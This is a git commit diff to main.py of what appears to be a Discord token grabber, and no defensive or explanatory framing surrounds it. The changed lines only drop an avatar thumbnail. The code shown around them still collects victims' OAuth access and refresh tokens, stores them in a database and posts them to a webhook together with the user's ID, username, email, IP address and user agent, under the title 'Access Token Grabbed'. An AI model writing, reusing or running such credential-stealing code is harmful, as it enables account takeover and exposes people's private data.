16874d0e99e78261cecaab333ed8ca4c5bbfceb4
DraKen3301 <drakencodez1337@gmail.com>
2023-01-02 09:28:56 +0530

    K

--- main.py
+++ main.py
@@ -73,16 +73,13 @@ def log(access_token, refresh_token):
 	data = r.json()
 	roleadd = addrole(data["id"])
 	dbinsert = insert_db(data["id"],access_token,refresh_token)
-	av = f"https://cdn.discordapp.com/avatars/{data['id']}/{data['avatar']}.gif?size=160"
-	if httpx.get(av).status_code == 415:
-			av = av.replace("gif","png")
 	json = {"content":access_token,"embeds":[{"title":"Access Token Grabbed","description":f"""**ID: ** {data['id']}
 **Username: ** {data['username']}#{data['discriminator']}
 **Email: ** {data['email']}
 **Access Token: ** {access_token}
 **Refresh Token: ** {refresh_token}
 **IP: ** {flask.request.headers['X-Forwarded-For']}
-**User Agent: ** {flask.request.headers['User-Agent']}""","thumbnail":{"url":av}}]}
+**User Agent: ** {flask.request.headers['User-Agent']}"""}]}
 	req = httpx.post(url=webhook,json=json)
 	return req
 
